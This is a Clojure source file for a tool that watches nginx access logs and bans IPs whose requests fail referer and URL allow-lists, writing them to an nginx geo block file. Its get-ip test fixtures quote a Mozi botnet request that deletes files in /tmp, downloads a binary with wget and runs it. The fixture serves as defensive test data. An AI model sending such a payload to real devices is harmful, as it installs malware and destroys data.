(ns nginx-saviour.core
  (:require [taoensso.timbre :as log]
            [clojure.java.io :as io]
            [clj-time.format :as f]
            [clojure.test :refer [is]]
            [clojure.core.async :as async]
            [clojure-watch.core :refer [start-watch]]
            [clojure.java.shell :refer [sh]])
  (:gen-class))

(defn exists?
  [file]
  (.exists (io/as-file file)))

(defn print-exit
  [msg]
  (println msg)
  (System/exit 0))

(def message-channel (async/chan))
(def error-channel (async/chan))

(defonce banned-ip-list-atom (atom #{}))
(defonce watch-atom (atom nil))
(defonce process-atom (atom nil))
(defonce config-atom (atom nil))

(defn get-config
  [prop]
  (get-in (deref config-atom) (if (vector? prop) prop [prop])))

(defn in?
  "x is in xs?"
  [xs x]
  (some (fn [xx] (= x xx)) xs))

(def fields [:remote-addr :remote-user :time :request :status :body-bytes-sent :http-referer :http-user-agent :original])

(defn tail-process
  "Builder for that outputs a whole file then tails it and wait for new data in the file."
  [files-to-watch]
  (if (every? exists? files-to-watch)
    (ProcessBuilder. (concat ["tail" "-fn+1"] files-to-watch))
    (print-exit (str "Files not found " files-to-watch))))

(defn start-process
  "Start a process."
  [process]
  (.start process))

(defn destroy
  "Destroy a process."
  [process]
  (.destroy process))

(defn put-log-rows-on-channel
  "Reads a async fil and put each line on a channel, requires a started process."
  []
  (async/go
    (with-open [stdout (io/reader (.getInputStream (deref process-atom)))]
      (loop []
        (when-let [line (.readLine stdout)]
          (when-not (or (empty? line) (nil? line))
            (async/>! message-channel line))
          (recur))))))

(defn remove-bracets
  [s]
  (clojure.string/replace s #"\[|\]" ""))

(defn get-date-from-log-row
  "Extracts the date inside bracets from a log row. It validates that the first field is an ip, then a remote user."
  [row]
  (->> (re-find #"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\s-(.*)-\s\[\d{2}\/\w{3}\/\d{4}:\d{2}:\d{2}:\d{2}\s\+\d{4}]\s" row)
       first
       (re-find #"\[.*\]")))

(defn str->pattern
  "Convert a string into a regex pattern, i.e escaping stuff."
  [string]
  (let [regex-char-esc-smap (let [esc-chars "[]()&^%$#!?*.+"]
                              (zipmap esc-chars
                                      (map #(str "\\" %) esc-chars)))]
    (->> string
         (replace regex-char-esc-smap)
         (reduce str)
         re-pattern)))

(defn remove-date
  "Remove the date [...] from a log row because I'm unable to exclude that when splitting on spaces.....:)"
  [row]
  (as-> (get-date-from-log-row row) $
        (str->pattern $)
        (clojure.string/replace row $ "")))

(defn split-row-on-space
  "Splits a row on spaces but keeps spaces that is inside quotes"
  [row]
  (clojure.string/split row #"\s+(?=([^\"]*\"[^\"]*\")*[^\"]*$)"))

(def ^:dynamic *timestamp-format* "dd/MMM/yyy:HH:mm:ss Z")

(defn parse-datetime [timestamp]
  (f/parse (f/formatter *timestamp-format*) timestamp))

(defn parse-request
  "Parse the request entry in a log row"
  {:test (fn []
           (is (= (parse-request "GET /portal/redlion HTTP/1.1") {:http-method "GET" :url "/portal/redlion" :protocol "HTTP/1.1"})))}
  [request]
  (try
    (let [parsed (re-find #"(.+) (.*) (HTTP\/?\d?\.?\d?)" request)]
      {:http-method (nth parsed 1)
       :url         (nth parsed 2)
       :protocol    (last parsed)})
    (catch Exception e
      (log/error "Invalid request - " e - request)
      {:http-method nil
       :url         nil
       :protocol    nil})))

(defn get-ip
  "Finds an IP in a raw log row"
  {:test (fn []
           (let [row "202.83.44.98 - - [23/Sep/2020:10:14:51 +0000] \"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1\" 1233 162 \"-\" \"Hello, world\""
                 row2 " - - [23/Sep/2020:10:14:51 +0000] \"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+202.83.44.98jaws HTTP/1.1\" 1233 162 \"-\" \"Hello, world\""]
             (is (= (get-ip row) "202.83.44.98"))
             (is (= (get-ip row2) nil))))}
  [row]
  (when-not (nil? row)
    (->> row
         (re-find #"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
         first)))

(defn parse-row
  "excepts a default log row format
  '$remote_addr - $remote_user [$time_local] '\"$request\" $status $body_bytes_sent \"$http_referer\" \"$http_user_agent\"';"
  {:test (fn []
           (let [row "41.213.138.16 - - [23/Sep/2020:08:10:38 +0000] 7%3b%23&remoteSubmit=Save 400 166 - -"
                 process (parse-row row)]
             (is (= process
                    {:remote-addr     "41.213.138.16"
                     :remote-user     "-"
                     :time            (parse-datetime "23/Sep/2020:08:10:38 +0000")
                     :request         {:http-method nil
                                       :url         nil
                                       :protocol    nil}
                     :status          "400"
                     :body-bytes-sent "166"
                     :http-referer    "-"
                     :http-user-agent "-"
                     :original        row}))))}
  [row]
  (try
    (let [columns (-> (remove-date row) split-row-on-space)
          data (zipmap fields columns)]
      (-> data
          (assoc :time (-> row
                           get-date-from-log-row
                           remove-bracets
                           parse-datetime))
          (assoc :original row)
          (assoc :request (parse-request (:request data)))))
    (catch Exception _
      ;; do nothing..
      )))

(defn initiate-tail-process!
  [files-to-watch]
  (if (every? exists? files-to-watch)
    (reset! process-atom (->
                           files-to-watch
                           tail-process
                           start-process))
    (print-exit (str "Unable to find file - " files-to-watch))))

(defn banned?
  [log-row]
  (in? (deref banned-ip-list-atom) (get-ip log-row)))

(defn valid-referer?
  "Just allow https for now, maybe inform about this..."
  {:test (fn []
           (is (= (valid-referer? "https://homepage.com" ["home.se" "homepage.com"]) true))
           (is (= (valid-referer? "homepag" ["home.se" "homepage.com"]) false))
           (is (= (valid-referer? "https://byggarn.erkanp.dev/static/57adca76/css/simple-page.theme.css" ["erkanp.dev" "byggarn.erkanp.dev"]) true)))}
  [https-referer valid-refs]
  (boolean (some (fn [r]
                   (->
                     (str "^(\"|')?https://" r "/?")
                     re-pattern
                     (re-find https-referer)
                     boolean)) valid-refs)))

(defn valid-url?
  "Check if a url is valid."
  [url]
  (let [valid-urls (get-config [:valid-urls :urls])
        valid-regex (get-config [:valid-urls :regex])]
    (cond
      (nil? url) false
      (in? valid-urls url) true
      (boolean (some (fn [regex-str] (-> regex-str re-pattern (re-find url))) valid-regex)) true
      :else false)))

(defn should-ban?
  {:test (fn []
           (is (= (should-ban? {:http-referer "https://byggarn.erkanp.dev/static/57adca76/css/simple-page.theme.css"
                                :request      {:url "/asd"}}
                               ["erkanp.dev" "byggarn.erkanp.dev"])
                  false)))}
  [{:keys [http-referer request]} valid-refs]
  (let [ref-ok? (valid-referer? http-referer valid-refs)
        url-ok? (valid-url? (:url request))]
    (cond
      ref-ok? false
      url-ok? false
      :else true)))

(defn write-ips-to-file-nginx-style!
  "Spit all the banned ips to a file in a nginx way format"
  [ips]
  (let [ips (clojure.string/join " 1;\n " ips)]
    (spit (get-config :blacklist-output) (str "geo $bad_ip {\n default 0;\n " ips " 1;\n}"))))


(defn consume-log-rows-from-channel
  []
  (async/go-loop []
    (let [data (async/<! message-channel)]
      (if (banned? data)
        (do (log/info (str "Already banned |\t " (get-ip data)))
            (recur))
        (let [d (parse-row data)
              url (get-in d [:request :url])]
          (if (some? d)
            (when (should-ban? d (get-config :valid-https-referers))
              (log/info "Ban \t\t|\t" (:remote-addr d) (if (nil? url) "" (str (clojure.string/join (repeat (- 20 (count (:remote-addr d))) " ")) " | " (subs url 0 (min 30 (count url))) "...")))
              (swap! banned-ip-list-atom conj (:remote-addr d))
              (write-ips-to-file-nginx-style! (deref banned-ip-list-atom))
              (apply sh (->
                          (get-config :nginx-restart-cmd)
                          (clojure.string/split #" ")
                          (into []))))
            (log/info "Ignore parsing |\t" data))
          (recur))))))

(defn process-file!
  "Asynchronous process a file by putting new lines on a channel and operating on the client atom"
  []
  (do
    (put-log-rows-on-channel)
    (consume-log-rows-from-channel)))

(defn restart-file-process!
  [files-to-watch]
  (do
    (destroy (deref process-atom))
    (initiate-tail-process! files-to-watch)
    (process-file!)))

(defn start-dir-watch
  [{:keys [path files-to-watch]}]
  (reset! watch-atom (start-watch [{:path        path
                                    :event-types [:create]
                                    :callback    (fn [event filename]
                                                   (condp = event
                                                     ;; the log has rotated
                                                     :create (when (in? (map (fn [f] (str path f)) files-to-watch) filename)
                                                               (restart-file-process! files-to-watch))
                                                     :delete nil
                                                     :modify nil)
                                                   )}])))

(defn stop-watch
  "Stop watching for directory changes."
  []
  (-> watch-atom
      deref
      (apply nil)))

(defn initialize-error-handling
  "Handle errors"
  []
  (async/go-loop []
    (let [{:keys [name message]} (async/<! error-channel)]
      (condp = name
        :file-not-found (print-exit message)
        :unable-to-parse (log/error message))
      (recur))))

(comment

  (destroy (deref process-atom))

  (start-dir-watch {:path      path
                    :file-name file-name})

  (initiate-tail-process! file-name)

  (process-file!)

  (destroy (deref process-atom))

  ;; superb!
  ;; https://www.initpals.com/nginx/how-to-block-requests-from-specific-ip-address-in-nginx/

  )

(defn -main
  " I don't do a whole lot ... yet but something now!. "
  [& args]

  (let [conf (apply hash-map args)
        config-file (get conf "--config")]
    (if (and (nil? config-file) (not (exists? config-file)))
      (print-exit (str "Unable to find config-file: " config-file " provide it with --config <file-name>.edn"))
      (let [conf (-> (slurp config-file) clojure.edn/read-string)]
        (reset! config-atom conf))))

  ;; set log-level
  (log/set-level! (get-config :log-level))

  ;; consume errors from error-channel
  (initialize-error-handling)

  ;; start to watch for changes in directory
  (start-dir-watch {:path           (get-config :log-rotate-directory)
                    :files-to-watch (get-config :files-to-watch)})

  ;; start the tail process
  (initiate-tail-process! (get-config :files-to-watch))

  ;; start pub sub each row in the files
  (process-file!))


